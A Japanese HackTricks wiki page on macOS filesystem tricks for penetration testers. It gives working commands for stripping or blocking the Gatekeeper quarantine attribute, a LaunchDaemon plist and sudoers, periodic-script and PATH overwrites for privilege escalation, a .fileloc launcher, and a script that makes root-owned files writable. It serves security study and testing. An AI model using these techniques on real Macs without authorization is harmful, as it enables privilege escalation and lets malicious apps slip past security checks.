# macOS FS Tricks

<details>

<summary><strong>ゼロからヒーローまでAWSハッキングを学ぶ</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE（HackTricks AWS Red Team Expert）</strong></a><strong>を使って学ぶ！</strong></summary>

HackTricksをサポートする他の方法:

* **HackTricksで企業を宣伝したい**または**HackTricksをPDFでダウンロードしたい**場合は、[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**公式PEASS＆HackTricksグッズ**](https://peass.creator-spring.com)を入手する
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見し、独占的な[**NFTs**](https://opensea.io/collection/the-peass-family)のコレクションを見る
* **💬 [Discordグループ](https://discord.gg/hRep4RUj7f)**に参加するか、[telegramグループ](https://t.me/peass)に参加するか、**Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)をフォローする。
* **ハッキングトリックを共有するには、[HackTricks](https://github.com/carlospolop/hacktricks)と[HackTricks Cloud](https://github.com/carlospolop/hacktricks-cloud)のGitHubリポジトリにPRを提出してください。**

</details>

## POSIX権限の組み合わせ

**ディレクトリ**の権限:

* **read** - ディレクトリエントリを**列挙**できる
* **write** - ディレクトリ内の**ファイルを削除/書き込み**し、**空のフォルダを削除**できる。
* ただし、**書き込み権限**がない限り、**空でないフォルダを削除/変更**することはできません。
* フォルダの名前を変更することはできません。
* **execute** - ディレクトリを**トラバース**することが許可されています - この権限がない場合、そのディレクトリ内のファイルやサブディレクトリにアクセスできません。

### 危険な組み合わせ

**rootが所有するファイル/フォルダを上書きする方法**:

* パス内の1つの親**ディレクトリ所有者**がユーザーである
* パス内の1つの親**ディレクトリ所有者**が**書き込みアクセス**を持つ**ユーザーグループ**である
* ユーザーグループが**ファイル**に**書き込み**アクセス権を持っている

前述のいずれかの組み合わせで、攻撃者は特権付きの任意の書き込みを取得するために期待されるパスに**sym/hard linkを挿入**することができます。

### フォルダルート R+X 特殊ケース

**rootだけがR+Xアクセス権を持つディレクトリ**にファイルがある場合、それらは**他の誰にもアクセスできません**。したがって、**ユーザーが読み取り可能なファイル**を**移動**する脆弱性がある場合、その**制限**のために読み取ることができないファイルを、このフォルダから**別のフォルダに移動**することが悪用される可能性があります。

例: [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/#nix-directory-permissions)

## シンボリックリンク / ハードリンク

特権付きプロセスが**制御可能なファイル**にデータを書き込んでいる場合、または**以前に低特権ユーザーによって作成された**ファイルにデータを書き込んでいる場合、ユーザーはシンボリックリンクまたはハードリンクを介して別のファイルを指すことができ、特権付きプロセスはそのファイルに書き込みます。

攻撃者が特権を昇格させるために**任意の書き込みを悪用**できる場所を確認してください。

## .fileloc

**`.fileloc`** 拡張子のファイルは、他のアプリケーションやバイナリを指すことができるため、それらを開くと、そのアプリケーション/バイナリが実行されます。\
例:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>URL</key>
<string>file:///System/Applications/Calculator.app</string>
<key>URLPrefix</key>
<integer>0</integer>
</dict>
</plist>
```
## 任意のFD

**プロセスに高い権限でファイルまたはフォルダを開かせる**ことができれば、**`crontab`**を悪用して`EDITOR=exploit.py`で`/etc/sudoers.d`内のファイルを開くようにし、`exploit.py`が`/etc/sudoers`内のファイルに対するFDを取得して悪用することができます。

例: [https://youtu.be/f1HA5QhLQ7Y?t=21098](https://youtu.be/f1HA5QhLQ7Y?t=21098)

## クォータンティンxattrsトリックを回避する

### 削除
```bash
xattr -d com.apple.quarantine /path/to/file_or_app
```
### uchg / uchange / uimmutable フラグ

ファイル/フォルダにこの不変属性がある場合、その上に xattr を配置することはできません。
```bash
echo asd > /tmp/asd
chflags uchg /tmp/asd # "chflags uchange /tmp/asd" or "chflags uimmutable /tmp/asd"
xattr -w com.apple.quarantine "" /tmp/asd
xattr: [Errno 1] Operation not permitted: '/tmp/asd'

ls -lO /tmp/asd
# check the "uchg" in the output
```
### defvfs マウント

**devfs** マウントは **xattr をサポートしていません** Fame in [**CVE-2023-32364**](https://gergelykalman.com/CVE-2023-32364-a-macOS-sandbox-escape-by-mounting.html)
```bash
mkdir /tmp/mnt
mount_devfs -o noowners none "/tmp/mnt"
chmod 777 /tmp/mnt
mkdir /tmp/mnt/lol
xattr -w com.apple.quarantine "" /tmp/mnt/lol
xattr: [Errno 1] Operation not permitted: '/tmp/mnt/lol'
```
### writeextattr ACL

このACLは、ファイルに`xattrs`を追加することを防ぎます。
```bash
rm -rf /tmp/test*
echo test >/tmp/test
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" /tmp/test
ls -le /tmp/test
ditto -c -k test test.zip
# Download the zip from the browser and decompress it, the file should be without a quarantine xattr

cd /tmp
echo y | rm test

# Decompress it with ditto
ditto -x -k --rsrc test.zip .
ls -le /tmp/test

# Decompress it with open (if sandboxed decompressed files go to the Downloads folder)
open test.zip
sleep 1
ls -le /tmp/test
```
### **com.apple.acl.text xattr + AppleDouble**

**AppleDouble**ファイル形式は、ACEを含むファイルをコピーします。

[**ソースコード**](https://opensource.apple.com/source/Libc/Libc-391/darwin/copyfile.c.auto.html)では、xattrとして保存されているACLテキスト表現である**`com.apple.acl.text`**が、展開されたファイルのACLとして設定されることがわかります。したがって、ACLを持つzipファイルにアプリケーションを圧縮し、他のxattrの書き込みを防止するACLを設定した場合、quarantine xattrはアプリケーションに設定されませんでした：

詳細については、[**元のレポート**](https://www.microsoft.com/en-us/security/blog/2022/12/19/gatekeepers-achilles-heel-unearthing-a-macos-vulnerability/)を参照してください。

これを再現するには、まず正しいACL文字列を取得する必要があります：
```bash
# Everything will be happening here
mkdir /tmp/temp_xattrs
cd /tmp/temp_xattrs

# Create a folder and a file with the acls and xattr
mkdir del
mkdir del/test_fold
echo test > del/test_fold/test_file
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold
chmod +a "everyone deny write,writeattr,writeextattr,writesecurity,chown" del/test_fold/test_file
ditto -c -k del test.zip

# uncomporess to get it back
ditto -x -k --rsrc test.zip .
ls -le test
```
（これが機能する場合でも、サンドボックスはquarantine xattrを書き込みます）

実際には必要ありませんが、念のため残しておきます：

{% content-ref url="macos-xattr-acls-extra-stuff.md" %}
[macos-xattr-acls-extra-stuff.md](macos-xattr-acls-extra-stuff.md)
{% endcontent-ref %}

## コード署名のバイパス

バンドルには、**`_CodeSignature/CodeResources`** というファイルが含まれており、**バンドル**内のすべての**ファイル**の**ハッシュ**が含まれています。 CodeResourcesのハッシュは**実行可能ファイルにも埋め込まれている**ため、それをいじることはできません。

ただし、一部のファイルの署名はチェックされません。これらはplist内でomitというキーを持っています。
```xml
<dict>
...
<key>rules</key>
<dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
<key>rules2</key>
...
<key>^(.*/)?\.DS_Store$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>2000</real>
</dict>
...
<key>^PkgInfo$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>20</real>
</dict>
...
<key>^Resources/.*\.lproj/locversion.plist$</key>
<dict>
<key>omit</key>
<true/>
<key>weight</key>
<real>1100</real>
</dict>
...
</dict>
```
次のコマンドを使用して、リソースの署名を計算することができます：

{% code overflow="wrap" %}
```bash
openssl dgst -binary -sha1 /System/Cryptexes/App/System/Applications/Safari.app/Contents/Resources/AppIcon.icns | openssl base64
```
## dmg ファイルのマウント

ユーザーは、既存のフォルダの上にカスタム dmg をマウントすることができます。以下は、カスタムコンテンツを含むカスタム dmg パッケージを作成する方法です:
```bash
# Create the volume
hdiutil create /private/tmp/tmp.dmg -size 2m -ov -volname CustomVolName -fs APFS 1>/dev/null
mkdir /private/tmp/mnt

# Mount it
hdiutil attach -mountpoint /private/tmp/mnt /private/tmp/tmp.dmg 1>/dev/null

# Add custom content to the volume
mkdir /private/tmp/mnt/custom_folder
echo "hello" > /private/tmp/mnt/custom_folder/custom_file

# Detach it
hdiutil detach /private/tmp/mnt 1>/dev/null

# Next time you mount it, it will have the custom content you wrote

# You can also create a dmg from an app using:
hdiutil create -srcfolder justsome.app justsome.dmg
```
{% endcode %}

通常、macOSは`com.apple.DiskArbitration.diskarbitrationd` Machサービス（`/usr/libexec/diskarbitrationd`で提供）と通信してディスクをマウントします。LaunchDaemonsのplistファイルに`-d`パラメータを追加して再起動すると、`/var/log/diskarbitrationd.log`にログが保存されます。\
ただし、`hdik`や`hdiutil`などのツールを使用して、`com.apple.driver.DiskImages` kextと直接通信することも可能です。

## 任意の書き込み

### 定期的なshスクリプト

スクリプトが**シェルスクリプト**として解釈される場合、**`/etc/periodic/daily/999.local`**シェルスクリプトを上書きして、毎日トリガーされるようにすることができます。

次のコマンドでこのスクリプトの実行を**偽装**できます: **`sudo periodic daily`**

### デーモン

**`/Library/LaunchDaemons/xyz.hacktricks.privesc.plist`**のような任意の**LaunchDaemon**を書き込み、任意のスクリプトを実行するplistを実行します:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple Computer//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
<key>Label</key>
<string>com.sample.Load</string>
<key>ProgramArguments</key>
<array>
<string>/Applications/Scripts/privesc.sh</string>
</array>
<key>RunAtLoad</key>
<true/>
</dict>
</plist>
```
### Sudoers File

**`/etc/sudoers.d/`** フォルダー内にファイルを作成して、**sudo** 権限を自分に付与することができます。

### PATH files

**`/etc/paths`** ファイルは PATH 環境変数を設定する主要な場所の1つです。これを上書きするには root 権限が必要ですが、**privileged process** からスクリプトが **full path なしでコマンドを実行** している場合、このファイルを変更して **hijack** することができるかもしれません。

`PATH` 環境変数に新しいフォルダーを読み込むために **`/etc/paths.d`** にファイルを書き込むこともできます。

## Generate writable files as other users

これにより、私に書き込み可能な root に属するファイルが生成されます ([**code from here**](https://github.com/gergelykalman/brew-lpe-via-periodic/blob/main/brew\_lpe.sh)). これは特権昇格として機能するかもしれません。
```bash
DIRNAME=/usr/local/etc/periodic/daily

mkdir -p "$DIRNAME"
chmod +a "$(whoami) allow read,write,append,execute,readattr,writeattr,readextattr,writeextattr,chown,delete,writesecurity,readsecurity,list,search,add_file,add_subdirectory,delete_child,file_inherit,directory_inherit," "$DIRNAME"

MallocStackLogging=1 MallocStackLoggingDirectory=$DIRNAME MallocStackLoggingDontDeleteStackLogFile=1 top invalidparametername

FILENAME=$(ls "$DIRNAME")
echo $FILENAME
```
## POSIX 共有メモリ

**POSIX 共有メモリ**は、POSIX 互換のオペレーティングシステムでプロセスが共通のメモリ領域にアクセスできるようにすることで、他のプロセス間通信方法と比較して高速な通信を実現します。これには、`shm_open()`で共有メモリオブジェクトを作成またはオープンし、`ftruncate()`でサイズを設定し、`mmap()`を使用してプロセスのアドレス空間にマッピングすることが含まれます。プロセスはその後、このメモリ領域に直接読み書きできます。同時アクセスを管理しデータの破損を防ぐために、ミューテックスやセマフォなどの同期メカニズムがよく使用されます。最後に、プロセスは`munmap()`と`close()`を使用して共有メモリをアンマップおよびクローズし、オプションで`shm_unlink()`を使用してメモリオブジェクトを削除します。このシステムは、複数のプロセスが共有データに迅速にアクセスする必要がある環境で効率的で高速なIPCに特に効果的です。

<details>

<summary>プロデューサーのコード例</summary>
```c
// gcc producer.c -o producer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Create the shared memory object
int shm_fd = shm_open(name, O_CREAT | O_RDWR, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Configure the size of the shared memory object
if (ftruncate(shm_fd, SIZE) == -1) {
perror("ftruncate");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Write to the shared memory
sprintf(ptr, "Hello from Producer!");

// Unmap and close, but do not unlink
munmap(ptr, SIZE);
close(shm_fd);

return 0;
}
```
</details>

<details>

<summary>コンシューマーコードの例</summary>
```c
// gcc consumer.c -o consumer -lrt
#include <fcntl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
const char *name = "/my_shared_memory";
const int SIZE = 4096; // Size of the shared memory object

// Open the shared memory object
int shm_fd = shm_open(name, O_RDONLY, 0666);
if (shm_fd == -1) {
perror("shm_open");
return EXIT_FAILURE;
}

// Memory map the shared memory
void *ptr = mmap(0, SIZE, PROT_READ, MAP_SHARED, shm_fd, 0);
if (ptr == MAP_FAILED) {
perror("mmap");
return EXIT_FAILURE;
}

// Read from the shared memory
printf("Consumer received: %s\n", (char *)ptr);

// Cleanup
munmap(ptr, SIZE);
close(shm_fd);
shm_unlink(name); // Optionally unlink

return 0;
}

```
</details>

## macOS Guarded Descriptors

**macOSガードディスクリプタ**は、macOSに導入されたセキュリティ機能で、ユーザーアプリケーションにおける**ファイルディスクリプタ操作**の安全性と信頼性を向上させるためのものです。これらのガードディスクリプタは、ファイルディスクリプタに特定の制限や「ガード」を関連付ける方法を提供し、それらはカーネルによって強制されます。

この機能は、**不正なファイルアクセス**や**競合状態**などの特定のセキュリティ脆弱性を防ぐのに特に役立ちます。これらの脆弱性は、たとえばスレッドがファイル記述にアクセスしている際に**別の脆弱なスレッドにアクセス権限を与える**場合や、ファイルディスクリプタが脆弱な子プロセスに**継承**される場合に発生します。この機能に関連するいくつかの関数は次のとおりです:

* `guarded_open_np`: ガード付きでFDを開く
* `guarded_close_np`: 閉じる
* `change_fdguard_np`: ディスクリプタのガードフラグを変更する（ガード保護を削除することも可能）

## 参考文献

* [https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/](https://theevilbit.github.io/posts/exploiting\_directory\_permissions\_on\_macos/)

<details>

<summary><strong>Learn AWS hacking from zero to hero with</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Other ways to support HackTricks:

* If you want to see your **company advertised in HackTricks** or **download HackTricks in PDF** Check the [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)!
* Get the [**official PEASS & HackTricks swag**](https://peass.creator-spring.com)
* Discover [**The PEASS Family**](https://opensea.io/collection/the-peass-family), our collection of exclusive [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Join the** 💬 [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Share your hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
